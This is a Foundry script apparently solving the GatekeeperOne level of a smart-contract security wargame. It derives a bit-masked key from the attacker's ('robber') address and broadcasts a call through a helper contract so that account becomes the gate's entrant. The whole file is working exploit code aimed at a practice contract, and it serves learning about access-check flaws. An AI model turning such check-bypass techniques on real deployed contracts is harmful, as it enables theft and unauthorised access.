// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "../../lib/forge-std/src/Script.sol";
import {GatekeeperOne} from "../src/L14__GatekeeperOne.sol";
import {L14_Caller__GatekeeperOne} from "../src/L14_Caller__GatekeeperOne.sol";

// Make it past the gatekeeper and register as an entrant to pass this level.

contract L14_Solution__GatekeeperOne is Script {
    GatekeeperOne public gatekeeperOne =
        GatekeeperOne(0x240e086a5595e5D2F215101E214a546B70B39976);

    L14_Caller__GatekeeperOne public gatekeeperOne_caller =
        L14_Caller__GatekeeperOne(0x158a3b858549531762B44d067DB9Be576d0334EF);

    address gatekeeper;

    function run() public {
        // Get key
        address _robberAccount = vm.envAddress("ACCOUNT");
        bytes8 _callerKey = bytes8(bytes2(uint16(uint160(_robberAccount)))) >>
            48;
        bytes8 _key = bytes8(uint64(0x0F << 60)) | _callerKey;

        // Call caller function
        gatekeeper = gatekeeperOne.entrant();
        console.log("Prev Gatekeeper: %s", gatekeeper);

        uint256 _robberPrivKey = vm.envUint("PRIV_KEY");
        vm.startBroadcast(_robberPrivKey);

        gatekeeperOne_caller.enterGate(_key);

        vm.stopBroadcast();

        gatekeeper = gatekeeperOne.entrant();
        console.log("New Gatekeeper: %s", gatekeeper);
    }
}
